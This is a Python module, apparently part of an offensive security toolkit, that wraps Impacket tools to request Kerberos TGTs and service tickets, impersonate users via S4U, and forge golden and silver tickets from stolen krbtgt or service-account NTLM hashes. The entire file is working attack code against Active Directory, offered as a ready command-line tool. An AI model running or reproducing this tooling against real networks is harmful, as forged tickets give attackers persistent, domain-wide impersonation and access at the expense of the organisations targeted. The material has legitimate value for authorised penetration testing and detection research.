#!/usr/bin/env python3
"""
ticket_attack — Kerberos ticket manipulation via Impacket.

CLI deps: impacket-getTGT, impacket-getST, impacket-ticketer, impacket-ticketConverter

Creates, requests, and manipulates Kerberos tickets (golden/silver/TGT/TGS).
"""

import json
import os
import time

from base_module import TacticalModule


class TicketAttack(TacticalModule):
    name = "ticket_attack"
    description = "Kerberos ticket manipulation via Impacket"

    def _add_module_args(self) -> None:
        self.parser.add_argument("--domain", required=True, help="AD domain")
        self.parser.add_argument("--dc-ip", required=True, help="Domain controller IP")
        self.parser.add_argument(
            "--action", choices=["get-tgt", "get-st", "golden", "silver", "convert"],
            required=True, help="Action to perform",
        )
        self.parser.add_argument("--username", help="Username")
        self.parser.add_argument("--password", help="Password")
        self.parser.add_argument("--hash", help="NTLM hash")
        self.parser.add_argument("--domain-sid", help="Domain SID (for golden/silver)")
        self.parser.add_argument("--krbtgt-hash", help="krbtgt NTLM hash (for golden ticket)")
        self.parser.add_argument("--service-hash", help="Service account hash (for silver ticket)")
        self.parser.add_argument("--spn", help="Service Principal Name (for get-st / silver)")
        self.parser.add_argument("--impersonate", help="User to impersonate (S4U)")
        self.parser.add_argument("--ticket-file", help="Ticket file path (for convert)")

    def run(self, args) -> None:
        start = time.monotonic()

        actions = {
            "get-tgt": self._get_tgt,
            "get-st": self._get_st,
            "golden": self._golden_ticket,
            "silver": self._silver_ticket,
            "convert": self._convert_ticket,
        }

        result = actions[args.action](args)
        duration_ms = int((time.monotonic() - start) * 1000)
        result["duration_ms"] = duration_ms

        self.log_run(args.db_path, self.name, json.dumps(vars(args), default=str),
                     0, "", "", duration_ms)
        self.output_success(result)

    def _get_tgt(self, args) -> dict:
        if not args.username:
            self.output_error("--username required for get-tgt")
        tgt_args = [f"{args.domain}/{args.username}"]
        if args.password:
            tgt_args.extend(["-password", args.password])
        elif args.hash:
            tgt_args.extend(["-hashes", args.hash])
        tgt_args.extend(["-dc-ip", args.dc_ip])

        result = self.run_tool("impacket-getTGT", tgt_args, timeout=args.timeout)
        ccache = f"{args.username}.ccache"
        return {"action": "get-tgt", "username": args.username,
                "ccache_file": ccache if os.path.exists(ccache) else None,
                "output": result.stdout[:3000]}

    def _get_st(self, args) -> dict:
        if not args.spn:
            self.output_error("--spn required for get-st")
        st_args = [f"{args.domain}/{args.username}"]
        if args.password:
            st_args.extend(["-password", args.password])
        elif args.hash:
            st_args.extend(["-hashes", args.hash])
        st_args.extend(["-dc-ip", args.dc_ip, "-spn", args.spn])
        if args.impersonate:
            st_args.extend(["-impersonate", args.impersonate])

        result = self.run_tool("impacket-getST", st_args, timeout=args.timeout)
        return {"action": "get-st", "spn": args.spn, "output": result.stdout[:3000]}

    def _golden_ticket(self, args) -> dict:
        if not args.domain_sid or not args.krbtgt_hash:
            self.output_error("--domain-sid and --krbtgt-hash required for golden ticket")
        tk_args = [
            "-nthash", args.krbtgt_hash, "-domain-sid", args.domain_sid,
            "-domain", args.domain,
        ]
        if args.username:
            tk_args.extend(["-user", args.username])

        result = self.run_tool("impacket-ticketer", tk_args, timeout=args.timeout)
        return {"action": "golden", "output": result.stdout[:3000]}

    def _silver_ticket(self, args) -> dict:
        if not args.domain_sid or not args.service_hash or not args.spn:
            self.output_error("--domain-sid, --service-hash, and --spn required for silver ticket")
        tk_args = [
            "-nthash", args.service_hash, "-domain-sid", args.domain_sid,
            "-domain", args.domain, "-spn", args.spn,
        ]
        if args.username:
            tk_args.extend(["-user", args.username])

        result = self.run_tool("impacket-ticketer", tk_args, timeout=args.timeout)
        return {"action": "silver", "spn": args.spn, "output": result.stdout[:3000]}

    def _convert_ticket(self, args) -> dict:
        if not args.ticket_file:
            self.output_error("--ticket-file required for convert")
        out_file = args.ticket_file.rsplit(".", 1)[0]
        if args.ticket_file.endswith(".ccache"):
            out_file += ".kirbi"
        else:
            out_file += ".ccache"

        result = self.run_tool("impacket-ticketConverter", [args.ticket_file, out_file], timeout=30)
        return {"action": "convert", "input": args.ticket_file, "output_file": out_file,
                "output": result.stdout[:3000]}


if __name__ == "__main__":
    TicketAttack().execute()
